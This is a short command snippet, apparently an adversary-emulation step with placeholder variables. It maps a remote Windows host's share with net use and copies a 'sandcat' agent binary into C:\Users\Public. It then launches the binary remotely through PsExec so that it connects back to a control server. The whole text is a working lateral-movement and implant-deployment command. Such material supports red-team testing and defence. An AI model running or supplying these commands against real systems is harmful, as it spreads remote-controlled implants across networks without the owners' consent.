net /y use \\#{remote.host.name} & copy /y sandcat.go-windows
\\#{remote.host.name}\Users\Public & #{psexec.path} -accepteula \\#{remote.host.name}
cmd /c start C:\Users\Public\sandcat.go-windows -server #{server} -v
